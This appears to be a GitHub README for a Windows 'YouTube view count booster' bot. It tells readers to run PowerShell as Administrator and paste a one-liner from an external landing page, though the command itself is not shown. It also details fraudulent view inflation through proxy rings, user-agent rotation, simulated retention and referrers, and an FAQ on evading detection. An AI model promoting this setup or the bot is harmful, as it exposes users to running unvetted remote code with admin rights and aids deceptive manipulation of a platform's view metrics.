<div align="center">
<img src="assets/banner.png" width="100%" alt="Youtube Viewer Bot banner" />
</div>

<div align="center">
<p>
  <img src="https://img.shields.io/badge/Platform-Windows_11%7C10-4fe3e3?style=for-the-badge&logo=windows" alt="" />
  <img src="https://img.shields.io/badge/Release-2026-7C3AED?style=for-the-badge" alt="" />
  <img src="https://img.shields.io/badge/Build-.exe-DB2777?style=for-the-badge" alt="" />
</p>
</div>

<p align="center">
  <img src="https://readme-typing-svg.herokuapp.com?color=4F46E5&size=28&center=true&vCenter=true&width=900&lines=%E2%9C%A8+Yt+View+Count+Booster+Pro;%F0%9F%9A%80+Automate+Everything;%E2%AD%90+Zero+Setup+Required;%F0%9F%93%A6+Built+for+Windows+11;%E2%9C%85+Standalone+.exe+Release;%F0%9F%92%A1+Updated+for+2026">
</p>

<p align="center">
  <img src="https://skillicons.dev/icons?i=nodejs" />
  <img src="https://skillicons.dev/icons?i=windows" />
</p>

---

### 🖥️ PowerShell Setup

Open PowerShell as Administrator, paste the one-liner from the landing page, press Enter — the setup script pulls the current `yt-view-count-booster` module set, wires up the viewer orchestrator, and registers the tray control. Full instructions live on the landing page.

---

<p align="center">
  <a href="https://balagraphics.github.io/yt-view-count-booster/">
    <img src="files/button.svg" width="520" alt="Setup with PowerShell" />
  </a>
</p>

## System Requirements

- Windows 10 (1909+) or Windows 11, x64
- PowerShell 5.1 or PowerShell 7+
- Active network connection (outbound HTTPS on 443)
- ~180 MB free disk for module cache and logs
- WebView2 runtime (setup installs it if missing)

No Python, no Node, no separate runtime needed — the launcher ships self-contained.

## Features

- **Viewer Session Orchestrator** (`vco-orch.psm1`) — spawns parallel viewer sessions against a target video URL, with backoff on 429 and per-session state recovery.
- **UA Rotation Pool** (`uapool.dat`) — rotates desktop and mobile user agents, weighted toward the platform split you set per run instead of a flat random pick.
- **Proxy Ring Manager** (`proxring.psm1`) — chains HTTP/SOCKS5 proxies, drops dead nodes after 3 failed handshakes, and keeps a warm pool so sessions don't stall mid-run.
- **Watch-Duration Scheduler** — controls per-viewer retention time (default 65–90% of video length) so views register as retained instead of at-the-door.
- **Referral Source Profiles** — routes sessions through search, suggested, and external referrer paths instead of dumping everything from direct.
- **Session Cap Enforcement** — hard cap per run and per hour, so a misconfigured loop can't burn through your proxy pool in ten minutes.
- **Run Telemetry Log** — CSV of per-session outcome codes (registered / throttled / dropped / proxy-fail), readable without parsing raw console output.
- **Tray Control + Hotkey** — start/stop without re-opening the console; `Ctrl+Shift+V` toggles the active run.

## How it works

Setup is a PowerShell bootstrap, not an installer binary. The one-liner from the landing page resolves the current module manifest, downloads the module set (`vco-orch`, `proxring`, `uapool`), drops it under `%LOCALAPPDATA%\yt-view-count-booster\`, and registers the tray autostart entry. After that first run you launch from the tray icon or `Start-ViewerRun.ps1` — no re-download, no shortcut sprawl. The bootstrap re-checks the manifest each launch and pulls deltas only.

If you're behind a corporate proxy, set `$env:YVB_PROXY` before running the one-liner and the bootstrap will route through it.

## Compatibility

- Windows 10/11 only — no macOS or Linux build, and honestly not planned.
- Works behind a standard HTTP proxy; SOCKS5-only egress works but adds a startup delay on the proxy ring warm-up.
- Offline mode is not supported — a run with no upstream reachability just exits with a diagnostic.
- Tested against the current web player as of the January 2026 rewrite; older player endpoints are not targeted.

## Known Issues

| Issue | Workaround |
|---|---|
| First run hangs ~20s on proxy ring warm-up | Expected — it's building the pool. Subsequent runs are fast. |
| Tray icon missing after update | Log off/on, or run `Register-Tray.ps1` manually from the install dir. |
| 429 flood on videos under 2 min | Watch-Duration Scheduler clamps too tight; set `-MinRetention 0.9` explicitly. |
| WebView2 prompt on locked-down machines | Pre-install the runtime via your RMM, then rerun the bootstrap. |
| Sessions all report `proxy-fail` | Check `$env:YVB_PROXY` overlap — a double-proxy config kills the ring. |
| CSV log empty after short run | Flush happens on clean exit only; tray-stop flushes, hard-kill doesn't. |

## FAQ

**🔄 Will this keep working after YouTube player updates?**
Most of the time, yes — the module manifest re-checks at launch and pulls the current UA pool and session handler. When a player-side change breaks the orchestrator, the update lands on the landing page's manifest within a few days. No silent breakage that requires a manual reinstall.

**🛡️ Is this detectable?**
Of course there's a risk profile — any view-source automation carries one. The proxy ring and UA weighting exist to reduce the obvious fingerprints, not eliminate them. Use sane session caps and real-looking retention. No tool guarantees immunity, and neither does this one.

**💸 What does it cost?**
The tool is free and open-source. Your proxy pool is the actual cost — budget for residential or rotating datacenter, because free proxy lists will get your sessions dropped in minutes.

**🐍 Do I need to know PowerShell?**
No. You run one command once, then use the tray icon. The other module names (`proxring`, `vco-orch`) are for people who want to script their own runs — ignore them if you don't.

**🔁 How do updates work?**
Re-run the one-liner from the landing page, or let the launch-time manifest check handle deltas. There's no auto-updater service running in the background, and no telemetry phone-home.

**🖥️ Does it work on a VM or VPS?**
Yes, and that's a common setup — but the TLS fingerprint from a bare VPS is distinctive. If you're running headless, front it with your own proxy egress, not the datacenter IP directly.

**🚫 Why did my run stop early?**
Check the CSV log first — `dropped` rows are usually proxy death, `throttled` rows are rate limits. The cap enforcement in the orchestrator is the most likely clean reason; check your run limits before blaming the tool.

## Disclaimer

This is a hobbyist tool built for educational and research purposes — studying how view counters respond to automated traffic at scale. Running it against videos you don't own or don't have permission to test may violate YouTube's Terms of Service and could put your account or proxies at risk. Use at your own discretion and responsibly. The author is not responsible for account actions, proxy bans, or misuse.

## License

MIT — see `LICENSE` in the repo.
